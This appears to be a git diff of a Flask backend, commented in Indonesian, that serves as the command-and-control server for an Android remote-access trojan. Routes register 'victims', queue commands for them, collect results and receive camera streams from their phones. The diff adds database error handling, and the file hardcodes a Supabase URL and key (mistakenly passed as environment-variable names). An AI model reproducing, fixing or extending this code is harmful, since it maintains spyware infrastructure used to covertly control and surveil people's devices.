@@ -11,14 +11,26 @@ CORS(app)
 SUPABASE_URL = os.environ.get("https://exzpctjvnjksubmjqtfv.supabase.co")
 SUPABASE_KEY = os.environ.get("sb_publishable_eY3Lqocmx5GafVMGOmBdTg_BnqEiyiQ")
 
-# ===== INISIALISASI SUPABASE CLIENT =====
-supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+# ===== INISIALISASI SUPABASE CLIENT (DENGAN ERROR HANDLING) =====
+supabase = None
+if SUPABASE_URL and SUPABASE_KEY:
+    try:
+        supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+        print("Supabase connected successfully")
+    except Exception as e:
+        print(f"Supabase connection error: {e}")
+        supabase = None
+else:
+    print("Supabase credentials not set in environment variables")
 
 # =============================================
 # ROUTE REGISTER (Client APK panggil saat pertama kali)
 # =============================================
 @app.route('/api/register', methods=['POST'])
 def register_victim():
+    if supabase is None:
+        return jsonify({"error": "Database not available"}), 500
+
     data = request.get_json()
     if not data:
         return jsonify({"error": "no data"}), 400
@@ -60,6 +72,9 @@ def register_victim():
 # =============================================
 @app.route('/api/victims', methods=['GET'])
 def get_victims():
+    if supabase is None:
+        return jsonify({"error": "Database not available"}), 500
+
     user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
     if not user_id:
         return jsonify({"error": "user_id required"}), 400
@@ -72,6 +87,9 @@ def get_victims():
 # =============================================
 @app.route('/api/cmd', methods=['POST'])
 def send_command():
+    if supabase is None:
+        return jsonify({"error": "Database not available"}), 500
+
     data = request.get_json()
     if not data:
         return jsonify({"error": "no data"}), 400
@@ -104,6 +122,9 @@ def send_command():
 # =============================================
 @app.route('/api/command/<victim_id>', methods=['GET'])
 def get_command(victim_id):
+    if supabase is None:
+        return jsonify({"action": "none"}), 500
+
     user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
     if not user_id:
         return jsonify({"action": "none"}), 400
@@ -123,6 +144,9 @@ def get_command(victim_id):
 # =============================================
 @app.route('/api/result', methods=['POST'])
 def receive_result():
+    if supabase is None:
+        return jsonify({"error": "Database not available"}), 500
+
     data = request.get_json()
     if not data:
         return jsonify({"error": "no data"}), 400
@@ -160,6 +184,9 @@ def receive_result():
 # =============================================
 @app.route('/api/results/<victim_id>', methods=['GET'])
 def get_results(victim_id):
+    if supabase is None:
+        return jsonify([]), 500
+
     user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
     if not user_id:
         return jsonify([]), 400
@@ -172,6 +199,9 @@ def get_results(victim_id):
 # =============================================
 @app.route('/api/stream/camera', methods=['POST'])
 def stream_camera():
+    if supabase is None:
+        return jsonify({"error": "Database not available"}), 500
+
     data = request.get_json()
     if not data:
         return jsonify({"error": "no data"}), 400
@@ -193,6 +223,9 @@ def stream_camera():
 
 @app.route('/api/stream/<victim_id>/camera', methods=['GET'])
 def get_camera_stream(victim_id):
+    if supabase is None:
+        return jsonify({"error": "Database not available"}), 500
+
     user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
     if not user_id:
         return jsonify({"error": "missing user"}), 400
